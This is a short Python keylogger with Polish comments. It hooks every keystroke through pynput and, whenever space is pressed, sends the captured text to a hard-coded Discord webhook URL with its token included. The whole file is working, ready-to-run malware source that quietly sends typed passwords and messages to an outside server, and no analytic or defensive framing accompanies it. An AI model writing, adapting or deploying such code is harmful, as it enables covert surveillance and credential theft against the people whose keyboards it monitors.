import os
import pynput.keyboard
import requests
import threading

# Webhook URL
webhook_url = "https://discord.com/api/webhooks/1116737603283202058/_IESZAd-T1gFQvON0sezWCdpDFdo3pHUSUDw5qe0ai1nIwQJ_7IlnNAM9_98T3tqBYPE"

keystrokes_cache = []
lock = threading.Lock()

def on_press(key):
    global keystrokes_cache
    if key == pynput.keyboard.Key.space:
        send_to_webhook(''.join(keystrokes_cache))
        keystrokes_cache = []
    else:
        try:
            keystrokes_cache.append(key.char)
        except AttributeError:
            pass

def send_to_webhook(message):
    if message:
        payload = {
            "content": message
        }
        response = requests.post(webhook_url, json=payload)
        if response.status_code != 204:
            print("Nie udało się wysłać wiadomości do webhooka.")

# Zadanie w tle
def background_task():
    while True:
        pass

if __name__ == "__main__":
    # Tworzenie wątku dla zadania w tle
    background_thread = threading.Thread(target=background_task)
    background_thread.daemon = True
    background_thread.start()

    # Odpala keylogger
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    # Oczekiwanie na zakończenie wątku w tle
    background_thread.join()